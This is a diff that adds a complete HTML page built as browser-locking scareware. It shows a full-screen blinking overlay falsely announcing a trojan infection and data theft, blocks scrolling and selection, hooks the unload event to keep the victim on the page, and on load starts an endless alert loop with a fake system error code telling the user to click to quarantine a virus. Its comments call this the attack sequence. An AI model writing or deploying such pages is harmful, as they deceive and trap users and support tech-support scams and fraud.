@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Security Alert</title>
+    <style>
+        /* Prevent scrolling, zooming, and selection */
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-touch-callout: none;
+        }
+
+        /* Full-screen overlay that is hard to remove */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            color: #ff0000;
+            font-family: monospace;
+            z-index: 999999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-size: 1.2em;
+        }
+
+        .error-title {
+            font-size: 2em;
+            font-weight: bold;
+            animation: blink 1s step-start infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay" id="mainOverlay">
+        <div class="error-title">!!! CRITICAL SYSTEM ERROR !!!</div>
+        <p>MALWARE DETECTED: TROJAN.SMSPAY.BAT</p>
+        <p>YOUR DATA IS BEING STOLEN.</p>
+        <p>DO NOT CLOSE THIS BROWSER.</p>
+    </div>
+
+    <script>
+        // Block attempts to navigate away
+        window.addEventListener('beforeunload', function (e) {
+            var confirmationMessage = 'Your data will be permanently lost.';
+            e.returnValue = confirmationMessage;
+            return confirmationMessage;
+        });
+
+        // Function to create a persistent, hard-to-close alert loop
+        function persistentAlert() {
+            while (true) {
+                alert("ERROR #0xC000021A: The system has detected a critical security breach. Your personal files, photos, and passwords are at risk of being stolen. Click OK to attempt to quarantine the virus.");
+            }
+        }
+
+        // Start the main attack sequence
+        function startAttack() {
+            // Start the alert loop after a short delay to let the overlay render
+            setTimeout(() => {
+                persistentAlert();
+            }, 1500);
+        }
+
+        // Run the attack when the page loads
+        window.onload = startAttack;
+    </script>
+</body>
+</html>
